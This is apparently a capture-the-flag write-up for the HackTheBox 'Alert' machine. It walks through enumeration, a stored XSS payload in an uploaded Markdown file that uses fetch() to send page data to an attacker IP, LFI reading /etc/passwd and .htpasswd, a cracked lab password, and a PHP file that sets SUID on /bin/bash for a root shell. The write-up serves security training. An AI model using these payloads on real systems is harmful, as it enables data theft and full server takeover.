---
layout: writeup
name: "alert"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/alert/
date: 2026-02-25
pwned: true
---
# Hack The Box - Alert (10.10.11.44)

## Overview
**Alert** is a Linux box that demonstrates how poor input validation and open-source misuse can lead to XSS, LFI, and privilege escalation. The attack chain moves from client-side injection to local file reads and finally code execution through a group-writable web app.

---

## 🔍 Enumeration

### Nmap
```bash
nmap -p- 10.10.11.44 --min-rate 5000
nmap -p 22,80,12227 -sC -sV -oN nmap_alert
```

**Open ports:**
- 22/tcp – SSH (OpenSSH 8.2)
- 80/tcp – HTTP (Apache 2.4.41)
- 12227/tcp – Filtered

---

## 🌐 Web Enumeration
- `alert.htb` showed a Markdown file uploader
- Discovered `statistics.alert.htb` via vhost fuzzing
- Found `/uploads`, `/messages`, `/server-status` through dir fuzzing

---

## 🧪 Exploiting the Markdown Upload (XSS → Data Exfiltration)
- Uploaded malicious `.md` with `<script>` to exfil data via `fetch()`
- Captured base64-encoded HTML with Python HTTP server
- Parsed DOM to discover hidden files like `messages.php`
- Used script to read and exfil file content via base64 fetch

### Key Payload Example
```html
<script>
fetch("http://alert.htb/messages.php")
  .then(r => r.text())
  .then(data => fetch("http://10.10.14.12/?data=" + btoa(data)))
</script>
```

---

## 🕵️‍♀️ Local File Inclusion (LFI)
- Used crafted markdown payload to exploit LFI via `messages.php?file=../../etc/passwd`
- Extracted `/etc/passwd`, `.htpasswd`, and app config files

### Cracked Credentials
```bash
$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/ → manchesterunited
```

---

## 🔐 User Access - Albert
- Used `albert:manchesterunited` to:
  - Log in at `statistics.alert.htb`
  - SSH into `alert.htb`

```bash
ssh albert@alert.htb
```

- Discovered user flag: `3265008ad462f871dbded2378cf52e64`

---

## 🧱 Privilege Escalation
- Found local service on port 8080: `/opt/website-monitor`
- `config/` folder was `management` group-writable; Albert belonged to that group
- Uploaded a malicious PHP file to modify `/bin/bash` permissions:

### Exploit Code (pwned.php)
```php
<?php exec("chmod +s /bin/bash"); ?>
```

- Triggered it via curl:
```bash
curl http://localhost:8080/config/pwned.php
```

- Used `bash -p` to spawn a root shell:
```bash
bash -p
whoami  # root
```

---

## 🏁 Root Flag
```bash
cat /root/root.txt
b7cefe59a57b8e147e765e4e63eacc66
```

---

## ✅ Summary Table

| Stage            | Technique                                      |
|------------------|-----------------------------------------------|
| Foothold         | Stored XSS → JS Fetch Exfil via Markdown      |
| Enumeration      | Virtual host & file fuzzing                   |
| Exploit          | LFI via PHP param injection & base64 trickery |
| User Access      | Cracked .htpasswd to get `albert` creds       |
| Priv Esc         | Group-writable PHP file modified `/bin/bash`  |

---

## 🧠 Lessons Learned
- Client-side exfil can pivot into full server reads
- LFI paired with base64 can bypass UI restrictions
- Weak permissions on group-owned web apps can be fatal

---

*Writeup by [Your Name]*  
*GitHub: [https://github.com/inkedqt/ctf-writeups]*
